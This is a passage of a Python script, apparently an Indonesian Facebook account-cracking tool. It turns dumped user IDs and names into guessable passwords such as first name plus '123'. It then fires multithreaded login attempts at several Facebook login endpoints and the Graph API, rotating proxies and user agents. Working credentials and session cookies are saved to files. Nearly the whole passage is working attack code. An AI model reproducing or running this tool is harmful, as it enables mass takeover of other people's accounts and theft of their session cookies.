            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
          elif cih>10 and cih<80:
            nom = ''+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
          else:
            lol.update({str(cih):str(isi)})
            print(f'\t{PU}['+str(cih)+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
        geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
        try:geh = lol[geeh]
        except KeyError:
          print(f'{ME} [+] Pilih Yang Bener')
          exit()
        try:os.system('rm -rf OK/'+geh);print(f'{HI} [+] succes deleted {geh}')
        except:os.system('rm OK/'+geh);print(f'{HI} [+] succes deleted {geh}')
  
  def cek_cpResult(self):
      try:vin = os.listdir('CP')
      except FileNotFoundError:
        print(' [+] File Tidak Di Temukan ')
        time.sleep(3)
        pass
      if len(vin)==0:
        print(' [+] Anda Tidak Memiliki Hasil CP ')
        time.sleep(4)
        pass
      else:
        cih = 0
        lol = {}
        for isi in vin:
          try:hem = open('CP/'+isi,'r').readlines()
          except:continue
          cih+=1
          if cih<10:
            nom = '0'+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
          elif cih>10 and cih<80:
            nom = ''+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
          else:
            lol.update({str(cih):str(isi)})
            print(f'\t{PU}['+str(cih)+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
        geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
        try:geh = lol[geeh]
        except KeyError:
          print(' [+] Pilih Yang Bener ')
          exit()
        try:lin = open('CP/'+geh,'r').read().splitlines()
        except:
          print(' [+] File Tidak Di Temukan ')
          time.sleep(4)
          pass
        nocp=0
        for cpku in range(len(lin)):
          cpkuni=lin[nocp].split('|')
          cpkuh=f'[+] ID|PASSWORD : {cpkuni[0]}|{cpkuni[1]}'
          gubluk_print(nel(cpkuh,style="bold yellow",width=60,padding=(0,2)))
          nocp +=1
  
  def cek_okResult(self):
      try:vin = os.listdir('OK')
      except FileNotFoundError:
        print(f'{ME} [+] File Tidak Di Temukan ')
        time.sleep(4)
        pass
      if len(vin)==0:
        print(f'{ME} [+] Anda Tidak Mempunyai File OK ')
        time.sleep(4)
        pass
      else:
        cih = 0
        lol = {}
        for isi in vin:
          try:hem = open('OK/'+isi,'r').readlines()
          except:continue
          cih+=1
          if cih<10:
            nom = '0'+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
          elif cih>10 and cih<80:
            nom = ''+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
          else:
            lol.update({str(cih):str(isi)})
            print(f'\t{PU}['+str(cih)+'] '+isi+f' [ {HI}'+str(len(hem))+f' Account {PU}]{DE}')
        geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
        try:geh = lol[geeh]
        except KeyError:
          print(' [+] Pilih Yang Bener')
          exit()
        try:lin = open('OK/'+geh,'r').read().splitlines()
        except:
          print(' [+] File Tidak Di Temukan ')
          time.sleep(4)
          pass
        nocp=0
        for cpku in range(len(lin)):
          cpkuni=lin[nocp].split('|')
          cpkuh=f'[+] ID|PASSWORD : {cpkuni[0]}|{cpkuni[1]}'
          gubluk_print(nel(cpkuh,style="green",width=60,padding=(0,2)))
          print(f'\t>>{UN} COOKIE : {PU}{cpkuni[2]}')
          nocp +=1
  
  # setting metode
  def setting(self):
    gubluk_print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Id Old ( [bold red]Not Recommended[bold white] )[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Id New ( [bold yellow]Recommended[bold white] )[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Id Random ( [bold green]Very Recommended[bold white] )[/]',width=50,padding=(0,2),title=f"[bold green]Set Urutan Id",style=f"bold purple"))
    hu = input(f'{BMM}┌──[{KT}Opsi Id{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if hu in ['1','01']:
      for tua in sorted(id):
        id2.append(tua)
    elif hu in ['2','02']:
      muda=[]
      for bussett in sorted(id):
        muda.append(bussett)
      bcm=len(muda)
      bcmi=(bcm-1)
      for xmud in range(bcm):
        id2.append(muda[bcmi])
        bcmi -=1
    elif hu in ['3','03']:
      for bussett in id:
        xx = random.randint(0,len(id2))
        id2.insert(xx,bussett)
    else:
      print(' [+] Pilih Yang Bener ')
      exit()
    gubluk_print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Validate V1 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]07[/][bold white]][/] [bold white]Regular V1 ( [bold green]Very Recommended[bold white] )[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Validate V2 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]08[/][bold white]][/] [bold white]Regular V2 ( [bold green]Very Recommended[bold white] )[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Validate V3 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]09[/][bold white]][/] [bold white]Regular V3 ( [bold green]Very Recommended[bold white] )[/]\n\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Async V1 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]10[/][bold white]][/] [bold white]Api V1 ( [bold yellow]Recommended[bold white] )[/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Async V2 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]11[/][bold white]][/] [bold white]Api V2 ( [bold yellow]Recommended[bold white] )[/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Async V3 ( [bold green]Very Recommended[bold white] )[/]\t[bold white][[bold cyan]12[/][bold white]][/] [bold white]Api V3 ( [bold yellow]Recommended[bold white] )[/]\n\n\t\t[bold white][[bold cyan]00[/][bold white]][/] [bold white]Login Random ( [bold red]Not Recommended[bold white] )[/]',width=82,padding=(0,2),title=f"[bold green]Set method",style=f"bold purple"))
    hc = input(f'{BMM}┌──[{KT}Opsi Methode{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if hc in ['1','01']:
      method.append('metodV1')
    elif hc in ['2','02']:
      method.append('metodV2')
    elif hc in ['3','03']:
      method.append('metodV3')
    elif hc in ['4','04']:
      method.append('metodV4')
    elif hc in ['5','05']:
      method.append('metodV5')
    elif hc in ['6','06']:
      method.append('metodV6')
    elif hc in ['7','07']:
      method.append('metodV7')
    elif hc in ['8','08']:
      method.append('metodV8')
    elif hc in ['9','09']:
      method.append('metodV9')
    elif hc in ['10','010']:
      method.append('metodV10')
    elif hc in ['11','011']:
      method.append('metodV11')
    elif hc in ['12','012']:
      method.append('metodV12')
    elif hc in ['0','00']:
      metodER = random.choice(['metodV1','metodV2','metodV3','metodV4','metodV5','metodV6','metodV7','metodV8','metodV9','metodV10','metodV11','metodV12'])
      method.append(metodER)
    else:
      method.append('metodV1')
    gubluk_print(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Password Default ( [bold green]Very Recommended[bold white] )\n[bold white][[bold cyan]02[bold white]] [bold white]Password Default+Manual ( [bold red]Not Recommended [bold white])[/][/]''',style='bold purple',title='[bold green]Set Password',padding=(0,2),width=55))
    pwplus=input(f'{BMM}┌──[{KT}Opsi Password{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if pwplus in ['02','2']:
      pwpluss.append('ya')
      pwku=input(f'{BMM}┌──[{KT}Password{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
      pwkuh=pwku.split(',')
      for xpw in pwkuh:
        pwnya.append(xpw)
    else:
      pwpluss.append('no')
    gubluk_print(panel(f'[bold white][[bold cyan]01[bold white]] User-Agent Manual ([bold red] Not Recommended [bold white])\n[[bold cyan]02[bold white]] User-Agent File ([bold yellow] Recommended [bold white])\n[[bold cyan]03[bold white]] User-Agent Default ([bold green] Very Recommended [bold white])[/]',width=50,padding=(0,2),title=f"[bold green]Set User-Agent",style=f"bold purple"))
    uatambah = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if uatambah in ['1','01']:
      ualuh.append('ya')
      bzer = input(f'{BMM}┌──[{KT} User-agent{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
      ualu.append(bzer)
    elif uatambah in ['2','02']:
      uafl.append('ya')
      self.ugen_file()
    else:
      ualuh.append('no')
      uafl.append('no')
    self.passwrd()
  
  # password list
  def passwrd(self):
    global prog,des
    gubluk_print(panel(f"[bold purple]OK SAVE IN : {okNdyZ}[bold white]",width=50,style=f"bold purple"))
    gubluk_print(panel(f"[bold yellow]CP SAVE IN : {cpNdyZ}[bold white]",width=50,style=f"bold yellow"))
    gubluk_print(panel(f'[bold white]On/Off Mode Pesawat Setiap 200 Id Agar Terhindar Dari Spam Ip',width=80,padding=(0,5),title=f"[bold green]Info",style=f"bold purple"))
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id2))
    with prog:
      with tred(max_workers=30) as pool:
        for yandex in id2:
          try:
            idf,nmf = yandex.split('|')[0],yandex.split('|')[1]
            frs = nmf.split(" ")[0]
            pwv = []
            if len(nmf)<6:
              if len(frs)<3:
                pass
              else:
                pwv.append(nmf)
                pwv.append(frs)
                pwv.append(frs+'123')
                pwv.append(frs+'321')
                pwv.append(frs+'1234')
            else:
              if len(frs)<3:
                pwv.append(nmf)
              else:
                pwv.append(nmf)
                pwv.append(frs)
                pwv.append(frs+'123')
                pwv.append(frs+'321')
                pwv.append(frs+'1234')
            if 'ya' in pwpluss: 
              for xpwd in pwnya:
                pwv.append(xpwd)
                pwv.append(frs+xpwd)
                pwv.append(nmf+xpwd)
                pwv.append(nmf+' '+xpwd)
                pwv.append(frs+' '+xpwd)
            else:pass
            if 'metodV1' in method:
              pool.submit(self.metodValidate,idf,pwv,'m.facebook.com')
            elif 'metodV2' in method:
              pool.submit(self.metodValidate,idf,pwv,'mbasic.facebook.com')
            elif 'metodV3' in method:
              pool.submit(self.metodValidate, idf, pwv, 'free.facebook.com')
            elif 'metodV4' in method:
              pool.submit(self.metodAsync, idf, pwv, 'm.facebook.com')
            elif'metodV5' in method:
              pool.submit(self.metodAsync, idf, pwv, 'mbasic.facebook.com')
            elif 'metodV6' in method:
              pool.submit(self.metodAsync, idf, pwv, 'free.facebook.com')
            elif 'metodV7' in method:
              pool.submit(self.metodRegular, idf, pwv, 'm.facebook.com')
            elif'metodV8' in method:
              pool.submit(self.metodRegular, idf, pwv, 'mbasic.facebook.com')
            elif 'metodV9' in method:
              pool.submit(self.metodRegular, idf, pwv, 'free.facebook.com')
            elif 'metodV10' in method:
              pool.submit(self.metodApi, idf, pwv)
            elif'metodV11' in method:
              pool.submit(self.metodApi, idf, pwv)
            elif 'metodV12' in method:
              pool.submit(self.metodApi, idf, pwv)
            else:
              pool.submit(self.metodValidate, idf, pwv, 'm.facebook.com')
          except IndexError:
            print(f'\n{ME}[-] Format Dump salah :/\n{HI}[+] Format yang benar: Id|Nama');exit()
    print('')
    gubluk_print(panel(f' [bold purple] [+] OK : {self.ok} ',width=50,style=f"bold purple"))
    gubluk_print(panel(f' [bold yellow] [+] CP : {self.cp} ',width=50,style=f"bold yellow"))
    print(f'\n Crack Selesai, semoga hasilnya tidak seperti tai mu :xd');time.sleep(.8)
    try:os.system('play-audio .crack.mp3')
    except:pass
  
  # metode validate
  def metodValidate(self, idf, pwv, urls):
    ua = random.choice(ugen)
    prog.update(des,description=f"[bold purple]{idf}[bold white] {self.loop}/{len(id)} OK-:[bold purple]{self.ok}[/] CP-:[bold yellow]{self.cp}[/]")
    prog.advance(des)
    for pw in pwv:
      try:
        if 'ya' in ualuh:ua = ualu[0]
        if 'ya' in uafl:ua = random.choice(myugen)
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ses = requests.Session()
        params = {"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","format":"JSON","sdk_version":{random.randrange(2, 31)},"email":idf,"locale":"id_ID","password":pw,"sdk":"android","generate_session_cookies":"1","sig":f"{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}"}
        head = {"Host":"graph.facebook.com","x-fb-connection-bandwidth":repr(random.randint(2e7, 3e7)),"x-fb-sim-hni":repr(random.randint(2e4, 4e4)),"x-fb-net-hni":repr(random.randint(2e4, 4e4)),"x-fb-connection-quality":"EXCELLENT","user-agent":ua,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"}
        po = ses.post("https://graph.facebook.com/auth/login", params=params, headers=head, allow_redirects=False)
        if "www.facebook.com" in po.text:
          self.cp+=1
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statuscp = f'{KT}{idf}|{pw}{BMM}'
          tree.add(statusth).add(statuscp)
          gubluk_print(tree)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'session_key' in po.text:
          self.ok+=1
          cok = {}
          ngeng = json.loads(po.text)
          coki = ngeng["session_cookies"]
          for x in coki:
              cok.update({x["name"]:x["value"]})
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statusok = f'{HI}{idf}|{pw}{BMM}'
          statuscok = f'{UN}{kuki}{BMM}'
          tree.add(statusth).add(statusok).add(statuscok)
          gubluk_print(tree)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
          break
        else:
          continue
      except requests.exceptions.ConnectionError:
        time.sleep(31)
    self.loop+=1
  
  # metode async
  def metodAsync(self, idf, pwv, urls):
    ua = random.choice(ugen)
    prog.update(des,description=f"[bold purple]{idf}[bold white] {self.loop}/{len(id)} OK-:[bold purple]{self.ok}[/] CP-:[bold yellow]{self.cp}[/]")
    prog.advance(des) 
    for pw in pwv:
      try:
        if 'ya' in ualuh:ua = ualu[0]
        if 'ya' in uafl:ua = random.choice(myugen)
        ses = requests.Session()
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ses.headers.update({"Host": urls,"cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
        link = ses.get("https://"+urls+"/")
        data ={'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'prefill_contact_point': idf, 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'encpass': f'#PWD_BROWSER:0:{str(tm()).split(".")[0]}:{pw}'}
        kueku = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
        kueku+=' m_pixel_ratio=2.625; wd=412x756'
        head ={"Host": urls,"content-length": f"{len(str(data))}","x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"origin": "https://"+urls,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "*/*","sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://"+urls+"/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","x-asbd-id": "129477"}
        po = ses.post('https://'+urls+'/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,cookies={'cookie': kueku,},headers=head,allow_redirects=False,proxies=proxs)
        if "checkpoint" in po.cookies.get_dict().keys():
          self.cp+=1
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statuscp = f'{KT}{idf}|{pw}{BMM}'
          tree.add(statusth).add(statuscp)
          gubluk_print(tree)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          akun.append(idf+'|'+pw)
          break
        elif "c_user" in ses.cookies.get_dict().keys():
          self.ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statusok = f'{HI}{idf}|{pw}{BMM}'
          statuscok = f'{UN}{kuki}{BMM}'
          tree.add(statusth).add(statusok).add(statuscok)
          gubluk_print(tree)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
          break
        else:
          continue
      except requests.exceptions.ConnectionError:
        time.sleep(31)
    self.loop+=1
  
  # metode regular
  def metodRegular(self, idf, pwv, urls):
    ua = random.choice(ugen)
    prog.update(des,description=f"[bold purple]{idf}[bold white] {self.loop}/{len(id)} OK-:[bold purple]{self.ok}[/] CP-:[bold yellow]{self.cp}[/]")
    prog.advance(des) 
    for pw in pwv:
      try:
        if 'ya' in ualuh:ua = ualu[0]
        if 'ya' in uafl:ua = random.choice(myugen)
        nip=random.choice(prox)
        proxs= {'http': 'socks5://'+nip}
        ses = requests.Session()
        link = ses.get('https://'+urls+'/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2F'+urls+'%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
        data = {'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': 0,'unrecognized_tries': 0,'email':idf,'pass':pw,'login':'Masuk','prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': False,'had_password_prefilled': False,'is_smart_lock': False,'bi_xrwh': 0,}
        kueku = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
        kueku+=' m_pixel_ratio=2.625; wd=412x756'
        head = {'Host': urls,'x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://'+urls,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://'+urls+'/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2F'+urls+'%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
        linked = random.choice(["https://"+urls+"/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2F"+urls+"%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://"+urls+"/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2F"+urls+"%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://"+urls+"/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2F"+urls+"%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
        po = ses.post(linked,data=data,headers=head,cookies={'cookie': kueku,},allow_redirects=False,proxies=proxs)
        if "checkpoint" in po.cookies.get_dict().keys():
          self.cp+=1
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statuscp = f'{KT}{idf}|{pw}{BMM}'
          tree.add(statusth).add(statuscp)
          gubluk_print(tree)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          akun.append(idf+'|'+pw)
          break
        elif "c_user" in ses.cookies.get_dict().keys():
          self.ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statusok = f'{HI}{idf}|{pw}{BMM}'
